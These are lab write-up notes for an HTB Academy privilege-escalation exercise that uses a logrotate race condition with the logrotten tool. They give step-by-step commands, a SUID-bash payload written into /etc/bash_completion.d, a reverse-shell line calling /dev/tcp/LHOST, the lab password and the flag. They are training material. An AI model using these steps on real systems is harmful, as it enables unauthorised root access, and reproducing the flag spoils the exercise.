# Section 17 — Logrotate (logrotten — Race Condition)

> Lab: `ACADEMY-LLPE-LOG` · `ssh htb-student@<T>` (`HTB_@cademy_stdnt!`)

## ✅ Answer (from walkthrough)

| Q | Answer |
|---|--------|
| Q1 — `/root/flag.txt` via logrotate race condition | **`HTB{l0G_r0t7t73N_00ps}`** |

Exploited **logrotate 3.11.0** race condition with **logrotten** → payload dropped into `/etc/bash_completion.d/` → sourced as root → SUID bash → flag.

---

## Concept

Logrotate renames old log files and creates new ones. Between the rename and the create, there's a **race window**: if you control the log directory, you can swap it with a symlink to a sensitive directory (like `/etc/bash_completion.d/`). Logrotate (running as root) then creates the new log file *through the symlink*, dropping your payload where it gets sourced by the next root bash session.

**Preconditions (all three required):**
1. **Write permissions** on the log file (you control what triggers rotation)
2. **logrotate runs as root** (so the file it creates through the symlink is root-owned but attacker-writable due to `create` preserving original ownership)
3. **Vulnerable version**: 3.8.6, 3.11.0, 3.15.0, 3.18.0

---

## Identify

```bash
logrotate --version                         # 3.8.6 / 3.11.0 / 3.15.0 / 3.18.0 = vulnerable
cat /etc/logrotate.conf                     # global config — look for 'create' vs 'compress'
ls /etc/logrotate.d/                        # per-service configs
cat /var/lib/logrotate.status               # which files are being rotated + when
find /home -writable -name '*.log' 2>/dev/null   # writable log files = your target
grep "create\|compress" /etc/logrotate.conf /etc/logrotate.d/* 2>/dev/null | grep -v "#"
```
> Check the logrotate status file — it tells you which logs are actively rotated by root. If you can write to any of those log files, you have a target.

---

## The logrotten Exploit

**How the race condition works:**
```
1. logrotate renames access.log → access.log.1        ← IN_MOVED_FROM event fires
2. logrotten detects event, swaps parent dir with      ← RACE WINDOW
   symlink → /etc/bash_completion.d
3. logrotate creates NEW access.log (via symlink)      ← file lands in bash_completion.d
4. logrotten writes payload into that file             ← payload = your reverse shell / SUID cmd
5. Next root bash session sources bash_completion.d    ← payload executes as root
```

**Get logrotten:**
```bash
# On attacker box:
git clone https://github.com/whotwagner/logrotten.git
cd logrotten

# IMPORTANT: compile ON the target (avoid GLIBC mismatch)
# Transfer logrotten.c via scp/wget, then:
gcc -o logrotten logrotten.c
```

**Determine create vs compress mode:**
```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
# 'create' → default mode (no -c flag)
# 'compress' → use -c flag
```

**Create payload (SUID approach — most reliable):**
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/payloadfile
```
> Reverse shells die in ~5 seconds because `/etc/bash_completion.d/` gets cleaned aggressively. The SUID bash payload persists — once `/tmp/bash` is created with the SUID bit, cleanup can't undo it.

**Run the exploit:**
```bash
# For 'create' mode (default — no -c flag):
./logrotten -p /tmp/payloadfile /home/htb-student/backups/access.log &

# Trigger rotation by writing data to the log:
cp ~/backups/access.log.1 ~/backups/access.log
# OR:
echo "trigger" > ~/backups/access.log
```

**Wait for rotation + escalate:**
```bash
# Poll for the SUID bash (cron fires logrotate periodically):
while [ ! -f /tmp/bash ]; do sleep 2; done

# Escalate:
/tmp/bash -p
cat /root/flag.txt
```

---

## Alternate payload approaches

| Payload | Command | Notes |
|---------|---------|-------|
| SUID bash (best) | `cp /bin/bash /tmp/bash; chmod +s /tmp/bash` | Persistent — survives cleanup |
| SUID dash | `cp /bin/dash /tmp/dash; chmod +s /tmp/dash` → `/tmp/dash -p` | Alternative if bash blocked |
| Reverse shell | `bash -i >& /dev/tcp/LHOST/9001 0>&1` | Dies in ~5 sec — have commands ready |
| Flag exfil | `cp /root/flag.txt /tmp/flag; chmod 777 /tmp/flag` | Direct flag grab, no shell needed |

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| `GLIBC_2.xx not found` | Compile logrotten **on the target**, not your attacker box |
| `fopen cfgpath: Permission denied` | You're using a modified logrotten that targets `/etc/logrotate.d/` instead of `/etc/bash_completion.d/` — use the original from GitHub |
| Exploit fires but payload never written | Race condition timing — kill old instances, reset, try again; may take multiple attempts |
| Reverse shell connects then dies | Use SUID payload instead; the bash_completion.d directory gets cleaned every few seconds |
| `git clone` fails on target | No internet — transfer `logrotten.c` via `scp` or `python3 -m http.server` from attacker |
| Multiple logrotten instances running | `pkill -u $(whoami) logrotten` before each new attempt |
| backups directory is a symlink (from failed attempt) | `rm ~/backups; mv ~/backups2 ~/backups` to restore |

---

## Exam / Engagement Notes

- `logrotate --version` → 3.8.6 / 3.11.0 / 3.15.0 / 3.18.0 = check for writable logs.
- `cat /var/lib/logrotate.status` reveals which logs root rotates — cross-reference with `find -writable`.
- **Always compile on target** — GLIBC mismatches between Kali and Ubuntu targets are common.
- `create` mode = default logrotten (no `-c`). `compress` mode = add `-c -s 4`.
- SUID payload >> reverse shell — the bash_completion.d cleanup kills shells in seconds.
- Race conditions are inherently flaky — multiple attempts may be needed. Reset the box if state gets corrupted.
- The logrotate config managing the target log may be hidden (e.g., in `/root/logrotate.conf`); don't waste time looking for it — focus on which logs are writable and actively rotated.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (HTB_@cademy_stdnt!)
2. logrotate --version -> 3.11.0 (vulnerable)
   cat /var/lib/logrotate.status -> /home/htb-student/backups/access.log rotated by root
   grep "create\|compress" /etc/logrotate.conf -> create (or check /etc/logrotate.d/*)
3. Transfer logrotten.c to target, compile: gcc -o logrotten logrotten.c
4. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/payloadfile
5. ./logrotten -p /tmp/payloadfile ~/backups/access.log &
   cp ~/backups/access.log.1 ~/backups/access.log    # trigger rotation
6. Wait for cron → /tmp/bash appears
   /tmp/bash -p
   cat /root/flag.txt -> HTB{l0G_r0t7t73N_00ps}      ✅
```

> One line: writable log + vulnerable logrotate + logrotten race condition = symlink swap drops SUID payload into bash_completion.d → root shell → flag.
